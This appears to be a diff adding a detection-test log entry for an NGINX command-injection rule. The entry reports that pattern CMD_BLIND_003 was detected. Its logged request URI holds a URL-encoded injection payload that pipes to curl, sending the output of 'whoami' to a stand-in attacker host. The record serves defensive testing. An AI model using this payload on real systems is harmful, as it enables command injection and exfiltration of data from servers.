@@ -1,0 +1,5 @@
+Pattern ID: CMD_BLIND_003
+        Status: passed
+        Latency: ~33000ms
+        Detection: 1 / 1
+        Rule: [NGINX CMDi] Command substitution attack test_id=CMD_BLIND_003-1769326207365-hx8jw6 pattern_id=CMD_BLIND_003 uri=/?q=%7C%20curl%20http%3A%2F%2Fattacker.com%2Fcallback%3Fdata%3D%60whoami%60 client=127.0.0.1
